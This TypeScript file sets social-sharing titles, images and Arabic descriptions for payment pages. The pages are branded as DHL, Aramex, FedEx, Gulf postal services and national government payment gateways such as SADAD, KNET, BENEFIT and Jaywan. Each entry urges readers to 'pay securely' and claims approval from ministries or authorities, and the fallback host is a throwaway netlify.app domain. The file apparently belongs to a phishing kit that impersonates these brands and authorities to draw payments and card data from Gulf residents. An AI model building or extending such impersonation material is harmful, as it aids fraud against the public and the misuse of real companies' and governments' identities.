/**
 * Enhanced Company Metadata Mapping
 * Maps each company to their specific OG meta tags for social sharing
 * تحديث ديناميكي للصورة والعنوان والوصف حسب الشركة
 */

export interface CompanyMeta {
  image: string;
  title: string;
  description: string;
}

const companyMetaMap: Record<string, CompanyMeta> = {
  // UAE - الإمارات
  aramex: {
    image: "/aramex-hero-official.png",
    title: "دفع آمن - أرامكس للشحن السريع 🚚",
    description: "خدمات شحن عالمية مع أرامكس - أكمل عملية الدفع بأمان تام للحصول على خدمات شحن سريعة وموثوقة في جميع أنحاء الخليج والعالم ✅"
  },
  dhl: {
    image: "/dhl-hero-official.png",
    title: "دفع آمن - DHL الشحن العالمي السريع ⚡",
    description: "DHL - الشبكة العالمية الأكبر للشحن السريع - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة وموثوقة إلى أي مكان في العالم 🌍"
  },
  dhlkw: {
    image: "/dhl-hero-official.png",
    title: "دفع آمن - DHL الكويت 🇰🇼",
    description: "DHL الكويت - شحن عالمي بسرعة وموثوقية - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة في الكويت والعالم 🌍"
  },
  dhlqa: {
    image: "/dhl-hero-official.png",
    title: "دفع آمن - DHL قطر 🇶🇦",
    description: "DHL قطر - شحن عالمي بسرعة وموثوقية - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة في قطر والعالم 🌍"
  },
  dhlom: {
    image: "/dhl-hero-official.png",
    title: "دفع آمن - DHL عمان 🇴🇲",
    description: "DHL عمان - شحن عالمي بسرعة وموثوقية - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة في عمان والعالم 🌍"
  },
  dhlbh: {
    image: "/dhl-hero-official.png",
    title: "دفع آمن - DHL البحرين 🇧🇭",
    description: "DHL البحرين - شحن عالمي بسرعة وموثوقية - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة في البحرين والعالم 🌍"
  },
  fedex: {
    image: "/fedex-hero-official.png",
    title: "دفع آمن - FedEx الشحن الدولي الموثوق 📦",
    description: "FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة مع تتبع فوري وضمان الوصول في الموعد المحدد ⏰"
  },
  ups: {
    image: "/ups-hero-official.png",
    title: "دفع آمن - UPS للشحن والتوصيل العالمي 🌐",
    description: "UPS - حلول لوجستية متكاملة - أكمل الدفع بأمان للحصول على خدمات شحن عالمية احترافية مع تغطية شاملة وتتبع دقيق 📍"
  },
  empost: {
    image: "/og-empost.jpg",
    title: "دفع آمن - البريد الإماراتي 🇦🇪",
    description: "البريد الإماراتي الرسمي - خدمات بريدية وشحن متميزة - ادفع بأمان واستمتع بخدمات الشحن المحلية والدولية الموثوقة ✨"
  },

  // Saudi Arabia - السعودية
  smsa: {
    image: "/smsa-hero-official.png",
    title: "دفع آمن - SMSA Express سمسا إكسبرس 🚛",
    description: "SMSA Express - الرائدة في الشحن السعودي - أكمل الدفع بأمان للحصول على خدمات توصيل سريعة في جميع أنحاء المملكة 🇸🇦"
  },
  zajil: {
    image: "/zajil-hero-official.png",
    title: "دفع آمن - زاجل للشحن السريع 📮",
    description: "زاجل - شحن سريع وموثوق في السعودية - ادفع بأمان واحصل على خدمات توصيل احترافية مع تغطية شاملة لكل المناطق 🇸🇦"
  },
  naqel: {
    image: "/naqel-hero-official.png",
    title: "دفع آمن - ناقل إكسبريس للشحن 🚚",
    description: "ناقل إكسبريس - خدمات شحن متطورة - أكمل دفعتك بأمان للحصول على توصيل سريع وآمن لجميع مدن ومناطق المملكة ⚡"
  },
  saudipost: {
    image: "/saudipost-hero-official.png",
    title: "دفع آمن - البريد السعودي 🇸🇦",
    description: "البريد السعودي الرسمي - خدمات بريدية وشحن موثوقة - ادفع بأمان واستفد من شبكة التوزيع الأوسع في المملكة 📦"
  },

  // Kuwait - الكويت
  kwpost: {
    image: "/og-kwpost.jpg",
    title: "دفع آمن - البريد الكويتي 🇰🇼",
    description: "البريد الكويتي الرسمي - خدمات بريدية وشحن متميزة - أكمل الدفع بأمان للحصول على خدمات توصيل محلية ودولية موثوقة ✅"
  },

  // Qatar - قطر
  qpost: {
    image: "/og-qpost.jpg",
    title: "دفع آمن - البريد القطري 🇶🇦",
    description: "البريد القطري الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واستمتع بخدمات توصيل سريعة وآمنة في قطر والعالم 🌍"
  },

  // Oman - عمان
  omanpost: {
    image: "/og-omanpost.jpg",
    title: "دفع آمن - البريد العُماني 🇴🇲",
    description: "البريد العُماني الرسمي - خدمات بريدية وشحن موثوقة - أكمل دفعتك بأمان للحصول على خدمات توصيل محلية ودولية متميزة 📮"
  },

  // Bahrain - البحرين
  bahpost: {
    image: "/og-bahpost.jpg",
    title: "دفع آمن - البريد البحريني 🇧🇭",
    description: "البريد البحريني الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واحصل على خدمات توصيل سريعة وموثوقة في البحرين والعالم ✨"
  },

  // Additional Companies
  jinakum: {
    image: "/og-jinakum.jpg",
    title: "دفع آمن - جينا كم للشحن 📦",
    description: "جينا كم - حلول شحن مبتكرة في الخليج - أكمل الدفع بأمان للحصول على خدمات لوجستية متطورة وتوصيل سريع 🚚"
  },
  jinaken: {
    image: "/og-jinaken.jpg",
    title: "دفع آمن - جيناكن للتوصيل 🚚",
    description: "جيناكن - خدمات توصيل سريعة في عمان - أكمل دفعتك بأمان للحصول على توصيل موثوق وتتبع مباشر 🇴🇲"
  },
  genacom: {
    image: "/og-genacom.jpg",
    title: "دفع آمن - جيناكم عمان 🏢",
    description: "جيناكم - شركة توصيل عمانية محلية - أكمل دفعتك بأمان للحصول على خدمات توصيل وشحن داخل سلطنة عمان ✅"
  },
  albaraka: {
    image: "/og-albaraka.jpg",
    title: "دفع آمن - مجموعة البركة 💰",
    description: "مجموعة البركة - خدمات مالية ولوجستية متكاملة - أكمل دفعتك بأمان للحصول على خدمات مصرفية وشحن موثوقة في الخليج ✅"
  },
  alfuttaim: {
    image: "/og-alfuttaim.jpg",
    title: "دفع آمن - مجموعة الفطيم 📦",
    description: "مجموعة الفطيم - حلول لوجستية متكاملة - أكمل دفعتك بأمان للحصول على خدمات شحن وتوزيع احترافية في المنطقة 🌍"
  },
  alshaya: {
    image: "/og-alshaya.jpg",
    title: "دفع آمن - مجموعة الشايع 🏪",
    description: "مجموعة الشايع - خدمات شحن وتوزيع لعلامات تجارية متعددة - أكمل دفعتك بأمان للحصول على خدمات لوجستية متميزة ✅"
  },
  shipco: {
    image: "/og-shipco.jpg",
    title: "دفع آمن - ShipCo للشحن الدولي 🌍",
    description: "ShipCo - خدمات شحن دولي متخصص - أكمل دفعتك بأمان للحصول على خدمات شحن بحري وجوي موثوقة ✅"
  },
  bahri: {
    image: "/og-bahri.jpg",
    title: "دفع آمن - بحري للشحن البحري 🚢",
    description: "بحري - الشركة الوطنية السعودية للشحن البحري - أكمل دفعتك بأمان للحصول على خدمات شحن بحري ولوجستيات متكاملة 🇸🇦"
  },
  national: {
    image: "/og-bahri.jpg",
    title: "دفع آمن - بحري للشحن البحري 🚢",
    description: "بحري - الشركة الوطنية السعودية للشحن البحري - أكمل دفعتك بأمان للحصول على خدمات شحن بحري ولوجستيات متكاملة 🇸🇦"
  },
  hellmann: {
    image: "/og-hellmann.jpg",
    title: "دفع آمن - Hellmann Worldwide Logistics ✈️",
    description: "Hellmann - شبكة دولية للشحن واللوجستيات - أكمل دفعتك بأمان للحصول على خدمات شحن عالمية متكاملة 🌐"
  },
  dsv: {
    image: "/og-dsv.jpg",
    title: "دفع آمن - DSV Logistics 🚛",
    description: "DSV - حلول شحن ولوجستيات متطورة - أكمل دفعتك بأمان للحصول على خدمات شحن جوي وبحري وبري متكاملة ✅"
  },
  agility: {
    image: "/og-agility-temp.jpg",
    title: "دفع آمن - Agiliti للوجستيات 📊",
    description: "Agility - خدمات لوجستية وشحن متطورة - أكمل دفعتك بأمان للحصول على حلول سلسلة إمداد واسعة النطاق 🌍"
  },

  // Government Services - خدمات الدفع الحكومية
  // Saudi Arabia - SADAD
  sadad: {
    image: "/sadad-hero-premium.png",
    title: "سداد - نظام المدفوعات الوطني السعودي 🇸🇦",
    description: "سداد SADAD | دفع رسوم جواز السفر، المخالفات المرورية، رخصة القيادة، الخدمات البلدية، العقود، بطاقة الأحوال، الخدمات التعليمية والصحية، تصاريح العمل، التأمين، استمارة المركبة، الجمارك وفواتير الخدمات | نظام آمن معتمد 🔒"
  },
  'sadad-passport': {
    image: "/sadad-hero-premium.png",
    title: "سداد - دفع رسوم جواز السفر 🇸🇦",
    description: "تجديد وإصدار جوازات السفر عبر نظام سداد الإلكتروني - دفع آمن ومعتمد من الجوازات السعودية ✅"
  },
  'sadad-traffic-violations': {
    image: "/sadad-hero-premium.png",
    title: "سداد - دفع المخالفات المرورية 🚗",
    description: "دفع مخالفات المرور عبر سداد - نظام آمن معتمد من إدارة المرور السعودية 🔒"
  },
  'sadad-driving-license': {
    image: "/sadad-hero-premium.png",
    title: "سداد - رخصة القيادة 🪪",
    description: "إصدار وتجديد رخص القيادة عبر سداد - خدمة إلكترونية معتمدة من المرور السعودي ✅"
  },
  'sadad-municipal': {
    image: "/sadad-hero-premium.png",
    title: "سداد - الخدمات البلدية 🏛️",
    description: "دفع رسوم الخدمات البلدية عبر سداد - نظام آمن للرخص البلدية والتصاريح 🔒"
  },
  'sadad-contracts': {
    image: "/sadad-hero-premium.png",
    title: "سداد - توثيق العقود 📄",
    description: "دفع رسوم توثيق العقود عبر سداد - خدمة معتمدة من وزارة العدل السعودية ✅"
  },
  'sadad-id-card': {
    image: "/sadad-hero-premium.png",
    title: "سداد - بطاقة الأحوال المدنية 🪪",
    description: "إصدار وتجديد بطاقة الأحوال المدنية عبر سداد - نظام إلكتروني آمن ومعتمد 🔒"
  },
  'sadad-education': {
    image: "/sadad-hero-premium.png",
    title: "سداد - الخدمات التعليمية 📚",
    description: "دفع الرسوم الدراسية والخدمات التعليمية عبر سداد - معتمد من وزارة التعليم ✅"
  },
  'sadad-health': {
    image: "/sadad-hero-premium.png",
    title: "سداد - الخدمات الصحية 🏥",
    description: "دفع رسوم المستشفيات والخدمات الصحية عبر سداد - نظام آمن معتمد من وزارة الصحة 🔒"
  },
  'sadad-work-permit': {
    image: "/sadad-hero-premium.png",
    title: "سداد - تصاريح العمل والإقامة 💼",
    description: "دفع رسوم تصاريح العمل والإقامة عبر سداد - خدمة معتمدة من الجوازات والعمل ✅"
  },
  'sadad-insurance': {
    image: "/sadad-hero-premium.png",
    title: "سداد - التأمين 🛡️",
    description: "دفع أقساط التأمين الطبي والسيارات عبر سداد - نظام دفع إلكتروني آمن 🔒"
  },
  'sadad-vehicle-registration': {
    image: "/sadad-hero-premium.png",
    title: "سداد - استمارة المركبة 🚗",
    description: "تجديد استمارة المركبة عبر سداد - خدمة معتمدة من إدارة المرور السعودية ✅"
  },
  'sadad-customs': {
    image: "/sadad-hero-premium.png",
    title: "سداد - الجمارك 📦",
    description: "دفع الرسوم الجمركية عبر سداد - نظام إلكتروني معتمد من هيئة الجمارك السعودية 🔒"
  },
  'sadad-utilities': {
    image: "/sadad-hero-premium.png",
    title: "سداد - فواتير الخدمات 💡",
    description: "دفع فواتير الكهرباء والماء والاتصالات عبر سداد - نظام دفع إلكتروني شامل ✅"
  },

  // Bahrain - BENEFIT
  benefit: {
    image: "/benefit-hero-premium.png",
    title: "بنفت - الشبكة الإلكترونية البحرينية 🇧🇭",
    description: "بنفت BENEFIT | دفع رسوم جواز السفر، المخالفات المرورية، بطاقة CPR، الخدمات البلدية وجميع الخدمات الحكومية | شبكة المدفوعات الوطنية الموثوقة 💳"
  },
  'benefit-passport': {
    image: "/benefit-hero-premium.png",
    title: "بنفت - دفع رسوم جواز السفر 🇧🇭",
    description: "تجديد وإصدار جوازات السفر عبر شبكة بنفت - نظام دفع آمن معتمد من الجوازات البحرينية ✅"
  },
  'benefit-traffic': {
    image: "/benefit-hero-premium.png",
    title: "بنفت - المخالفات المرورية 🚗",
    description: "دفع مخالفات المرور عبر بنفت - شبكة دفع إلكترونية معتمدة من المرور البحريني 🔒"
  },
  'benefit-cpr': {
    image: "/benefit-hero-premium.png",
    title: "بنفت - بطاقة CPR البحرينية 🪪",
    description: "إصدار وتجديد البطاقة الشخصية CPR عبر بنفت - خدمة معتمدة من هيئة المعلومات والحكومة الإلكترونية ✅"
  },
  'benefit-municipal': {
    image: "/benefit-hero-premium.png",
    title: "بنفت - الخدمات البلدية 🏛️",
    description: "دفع رسوم الخدمات البلدية عبر بنفت - نظام إلكتروني آمن ومعتمد 🔒"
  },

  // Kuwait - KNET
  knet: {
    image: "/knet-hero-premium.png",
    title: "كي نت - شبكة الكويت الوطنية 🇰🇼",
    description: "كي نت KNET | دفع رسوم جواز السفر، البطاقة المدنية، المخالفات المرورية، الخدمات البلدية وجميع الخدمات الحكومية | نظام الدفع الإلكتروني الرائد ✅"
  },
  'knet-passport': {
    image: "/knet-hero-premium.png",
    title: "كي نت - دفع رسوم جواز السفر 🇰🇼",
    description: "تجديد وإصدار جوازات السفر عبر كي نت - نظام دفع آمن معتمد من إدارة الجوازات الكويتية ✅"
  },
  'knet-paci': {
    image: "/knet-hero-premium.png",
    title: "كي نت - البطاقة المدنية PACI 🪪",
    description: "رسوم البطاقة المدنية عبر كي نت - خدمة معتمدة من الهيئة العامة للمعلومات المدنية 🔒"
  },
  'knet-traffic': {
    image: "/knet-hero-premium.png",
    title: "كي نت - المخالفات المرورية 🚗",
    description: "دفع مخالفات المرور عبر كي نت - نظام إلكتروني معتمد من إدارة المرور الكويتية ✅"
  },
  'knet-municipal': {
    image: "/knet-hero-premium.png",
    title: "كي نت - الخدمات البلدية 🏛️",
    description: "دفع رسوم البلدية عبر كي نت - شبكة دفع آمنة ومعتمدة 🔒"
  },

  // Oman - OmanNet/Maal
  omannet: {
    image: "/maal-hero-premium.png",
    title: "عُمان نت - بطاقة مال 🇴🇲",
    description: "عُمان نت OmanNet - بطاقة مال | دفع رسوم جواز السفر، بطاقة الهوية، المخالفات المرورية، الخدمات البلدية وجميع الخدمات الحكومية | شبكة الدفع الإلكتروني الوطنية 💳"
  },
  'omannet-passport': {
    image: "/maal-hero-premium.png",
    title: "عُمان نت - دفع رسوم جواز السفر 🇴🇲",
    description: "تجديد وإصدار جوازات السفر عبر عُمان نت - نظام دفع آمن معتمد من شرطة عُمان السلطانية ✅"
  },
  'omannet-id': {
    image: "/maal-hero-premium.png",
    title: "عُمان نت - بطاقة الهوية 🪪",
    description: "إصدار وتجديد بطاقة الهوية عبر عُمان نت - خدمة معتمدة من الأحوال المدنية العُمانية 🔒"
  },
  'omannet-traffic': {
    image: "/maal-hero-premium.png",
    title: "عُمان نت - المخالفات المرورية 🚗",
    description: "دفع مخالفات المرور عبر عُمان نت - نظام إلكتروني معتمد من شرطة عُمان السلطانية ✅"
  },
  'omannet-municipal': {
    image: "/maal-hero-premium.png",
    title: "عُمان نت - الخدمات البلدية 🏛️",
    description: "دفع رسوم الخدمات البلدية عبر عُمان نت - شبكة دفع آمنة ومعتمدة 🔒"
  },

  // UAE - Jaywan
  jaywan: {
    image: "/jaywan-hero-premium.png",
    title: "جيوان - نظام الدفع الإماراتي 🇦🇪",
    description: "جيوان Jaywan | دفع رسوم جواز السفر، الهوية الإماراتية، المخالفات المرورية، الخدمات البلدية، خدمات الإقامة وجميع الخدمات الحكومية | نظام الدفع الإلكتروني الوطني 🏛️"
  },
  'jaywan-passport': {
    image: "/jaywan-hero-premium.png",
    title: "جيوان - دفع رسوم جواز السفر 🇦🇪",
    description: "تجديد وإصدار جوازات السفر عبر جيوان - نظام دفع آمن معتمد من الهيئة الاتحادية للهوية والجنسية ✅"
  },
  'jaywan-emirates-id': {
    image: "/jaywan-hero-premium.png",
    title: "جيوان - الهوية الإماراتية 🪪",
    description: "إصدار وتجديد الهوية الإماراتية عبر جيوان - خدمة معتمدة من الهيئة الاتحادية للهوية والجنسية 🔒"
  },
  'jaywan-traffic': {
    image: "/jaywan-hero-premium.png",
    title: "جيوان - المخالفات المرورية 🚗",
    description: "دفع مخالفات المرور عبر جيوان - نظام إلكتروني معتمد من وزارة الداخلية الإماراتية ✅"
  },
  'jaywan-municipal': {
    image: "/jaywan-hero-premium.png",
    title: "جيوان - الخدمات البلدية 🏛️",
    description: "دفع رسوم الخدمات البلدية عبر جيوان - شبكة دفع آمنة ومعتمدة 🔒"
  },
  'jaywan-visa': {
    image: "/jaywan-hero-premium.png",
    title: "جيوان - خدمات الإقامة والتأشيرات 🛂",
    description: "رسوم الإقامة والتأشيرات عبر جيوان - نظام آمن معتمد من الهيئة الاتحادية للهوية والجنسية ✅"
  },

  // Qatar - Government Payment
  'qatar-gov': {
    image: "/qatar-gov-hero-premium.png",
    title: "بوابة الدفع الحكومي القطرية 🇶🇦",
    description: "بوابة الدفع الحكومي | دفع رسوم جواز السفر، بطاقة الهوية، المخالفات المرورية، الخدمات البلدية وجميع الخدمات الحكومية في قطر | نظام الدفع الإلكتروني الرسمي 🏛️"
  },
  'qatar-passport': {
    image: "/qatar-gov-hero-premium.png",
    title: "بوابة الدفع القطرية - جواز السفر 🇶🇦",
    description: "تجديد وإصدار جوازات السفر عبر بوابة الدفع القطرية - نظام آمن معتمد من وزارة الداخلية ✅"
  },
  'qatar-id': {
    image: "/qatar-gov-hero-premium.png",
    title: "بوابة الدفع القطرية - بطاقة الهوية 🪪",
    description: "إصدار وتجديد بطاقة الهوية عبر بوابة الدفع القطرية - خدمة معتمدة من وزارة الداخلية 🔒"
  },
  'qatar-traffic': {
    image: "/qatar-gov-hero-premium.png",
    title: "بوابة الدفع القطرية - المخالفات المرورية 🚗",
    description: "دفع مخالفات المرور عبر بوابة الدفع القطرية - نظام إلكتروني معتمد من إدارة المرور ✅"
  },
  'qatar-municipal': {
    image: "/qatar-gov-hero-premium.png",
    title: "بوابة الدفع القطرية - الخدمات البلدية 🏛️",
    description: "دفع رسوم الخدمات البلدية عبر بوابة الدفع القطرية - نظام آمن ومعتمد 🔒"
  },

  // Service Categories
  government_payment: {
    image: "/og-government_payment.jpg",
    title: "الدفع الحكومي - خدمات إلكترونية متكاملة 🏛️",
    description: "منصة موحدة لدفع جميع الخدمات الحكومية | جواز السفر، البطاقات الشخصية، المخالفات المرورية، الخدمات البلدية والمزيد | نظام دفع آمن ومعتمد 🔒✅"
  },
  chalets: {
    image: "/og-chalets.jpg",
    title: "حجز الشاليهات والاستراحات 🏖️",
    description: "حجز شاليهات واستراحات فاخرة في دول الخليج - دفع آمن عبر الإنترنت مع ضمان الحجز الفوري ✅"
  },
  contracts: {
    image: "/og-contracts.jpg",
    title: "توثيق العقود الإلكترونية 📄",
    description: "خدمة توثيق العقود الإلكترونية - دفع آمن معتمد لتوثيق جميع أنواع العقود والاتفاقيات 🔒"
  },
  invoices: {
    image: "/og-invoices.jpg",
    title: "الفواتير الإلكترونية 🧾",
    description: "إنشاء وإدارة الفواتير الإلكترونية - نظام متكامل لإصدار واستلام وتتبع الفواتير 💼"
  },
  health_links: {
    image: "/og-health_links.jpg",
    title: "الخدمات الصحية الإلكترونية 🏥",
    description: "دفع رسوم الخدمات الصحية والمستشفيات - نظام آمن للمواعيد الطبية والفواتير الصحية 💊"
  },
  local_payment: {
    image: "/og-local_payment.jpg",
    title: "المدفوعات المحلية 💳",
    description: "نظام الدفع المحلي الآمن - تحويلات ومدفوعات محلية سريعة وموثوقة لجميع الخدمات 🔒"
  },
  bank_pages: {
    image: "/og-bank_pages.jpg",
    title: "الخدمات البنكية الإلكترونية 🏦",
    description: "منصة شاملة للخدمات البنكية - حوالات، مدفوعات، وإدارة حساباتك بكل أمان وسهولة 💰"
  },

  // Default fallback
  default: {
    image: "/sadad-hero-premium.png",
    title: "منصة الدفع الذكية - خدمات دفع آمنة لدول الخليج 💳",
    description: "منصة متكاملة لخدمات الدفع الإلكتروني في دول الخليج - شحن، فواتير، عقود، خدمات حكومية وصحية بأمان وسهولة تامة"
  }
};

/**
 * Get absolute URL for image
 */
function getAbsoluteImageUrl(imagePath: string): string {
  if (imagePath.startsWith('http')) {
    return imagePath;
  }
  
  const productionDomain = typeof window !== 'undefined'
    ? window.location.origin
    : (import.meta.env.VITE_PRODUCTION_DOMAIN || 'https://sensational-fenglisu-ebbbfb.netlify.app');
  
  return `${productionDomain}${imagePath}`;
}

/**
 * Get company metadata with fallback and absolute URLs
 * @param companyKey - Company identifier (e.g., 'dhl', 'aramex')
 * @returns Company metadata object with absolute image URL
 */
export const getCompanyMeta = (companyKey: string): CompanyMeta => {
  if (!companyKey) {
    const defaultMeta = companyMetaMap.default;
    return {
      ...defaultMeta,
      image: getAbsoluteImageUrl(defaultMeta.image)
    };
  }

  const key = companyKey.toLowerCase();
  const meta = companyMetaMap[key] || companyMetaMap.default;
  
  return {
    ...meta,
    image: getAbsoluteImageUrl(meta.image)
  };
};
